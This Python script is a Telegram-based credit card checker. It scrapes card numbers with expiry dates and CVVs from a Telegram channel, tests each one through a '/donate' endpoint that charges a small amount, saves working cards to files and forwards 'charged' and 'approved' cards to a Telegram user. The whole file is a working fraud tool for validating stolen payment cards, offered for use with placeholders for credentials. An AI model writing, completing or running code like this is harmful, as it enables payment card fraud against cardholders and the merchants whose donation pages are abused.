import os
import re
import asyncio
import aiohttp

from telethon import TelegramClient, events
from colorama import Fore, Style, init

init(autoreset=True)

# Data required
api_id = 0 # CHANGE TO YOUR API ID
api_hash = 'xxx' # CHANGE TO YOUR API HASH

# URL
api_url = '' # CHANGE TO YOUR API URL

# Scrape and Forward
t_scrape = '' # Telegram Channel to Scrape
t_username = '' # Telegram username to Forward

if os.path.exists('result') == False:
    os.makedirs('result')

client = TelegramClient('telegram', api_id, api_hash)

# Async request function
async def RequestURL(session, card):
    try:
        async with session.get(f'{api_url}/donate?cc={card}') as response:
            data = await response.json()
            message = data.get('message', '')

            if message == 'Charged':
                f = os.path.join('result', 'charged.txt')
                with open(f, 'a') as file:
                    file.write(f"{card}\n")
                print(f'{Fore.BLUE}[HITS] {card} => Charged')

                # Forward Telegram
                telesage = (
                    f"┏━━━━━━━\n"
                    f"┣ ➡️ : `{card}`\n"
                    f"┣ ➡️ : **$1 Charged !**\n"
                    f"┗━━━━━━━━━━━\n"
                )
                await client.send_message(t_username, telesage)
            elif message == 'Approved':
                f = os.path.join('result', 'approved.txt')
                with open(f, 'a') as file:
                    file.write(f"{card}\n")
                print(f'{Fore.GREEN}[LIVE] {card} => Approved')

                # Forward Telegram
                telesage = (
                    f"┏━━━━━━━\n"
                    f"┣ ➡️ : `{card}`\n"
                    f"┣ ➡️ : **Approved !**\n"
                    f"┗━━━━━━━━━━━\n"
                )
                await client.send_message(t_username, telesage)
            elif message == 'Your card has insufficient funds.':
                f = os.path.join('result', 'insuf.txt')
                with open(f, 'a') as file:
                    file.write(f"{card}\n")
                print(f'{Fore.MAGENTA}[LIVE] {card} => Your card has insufficient funds.')
            elif message == "Your card's security code is incorrect.":
                f = os.path.join('result', 'ccn.txt')
                with open(f, 'a') as file:
                    file.write(f"{card}\n")
                print(f'{Fore.MAGENTA}[LIVE] {card} => Your card\'s security code is incorrect.')
            else:
                print(f'{Fore.RED}[DIED] {card} => {message}')
    except Exception as e:
        print(f'{Fore.YELLOW}[EROR] {card} => {e}')

# Message handler
@client.on(events.NewMessage(chats=t_scrape))
async def handler(event):
    raw = event.text
    message_raw = re.findall(
        r'\b\d{16}\|\d{2}\|(?:\d{2}|\d{4})\|\d{3}\b|\b\d{15}\|\d{2}\|(?:\d{2}|\d{4})\|\d{4}\b',
        raw
    )

    if not message_raw:
        return

    async with aiohttp.ClientSession() as session:
        tasks = [RequestURL(session, card) for card in message_raw]
        await asyncio.gather(*tasks)

# Main client runner
async def main():
    await client.start()
    print("Telegram client is running and listening...")
    await client.run_until_disconnected()

if __name__ == '__main__':
    try:
        client.loop.run_until_complete(main())
    except KeyboardInterrupt:
        client.disconnect()
        print('Closing the program.')
        exit(0)
